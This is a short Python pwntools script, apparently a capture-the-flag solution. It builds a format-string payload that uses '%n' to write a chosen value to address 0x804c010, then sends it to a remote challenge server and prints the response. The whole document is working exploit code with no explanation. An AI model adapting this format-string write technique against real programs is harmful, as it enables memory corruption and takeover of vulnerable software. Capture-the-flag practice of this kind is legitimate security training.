from pwn import *

payload = p32(0x804c010)+'%134517202x'+'%12$n'
p = remote('chall.csivit.com', 30023)
p.sendline(payload)
print p.recvall()[-100:]
